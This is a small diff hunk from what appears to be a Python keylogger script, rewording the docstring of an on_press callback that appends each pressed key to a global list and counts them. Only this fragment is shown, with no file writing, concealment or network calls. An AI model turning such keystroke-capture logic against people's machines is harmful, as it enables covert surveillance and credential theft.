@@ -8,7 +8,7 @@ count, keys = 0, []
 
 
 def on_press(key):
-    """Reset the `count` to zero, and transfer the data in `keys` to the designated text file while clearing the list."""
+    """Worker function to write keystrokes to a file in the background."""
     global keys, count
     keys.append(key)
     count += 1
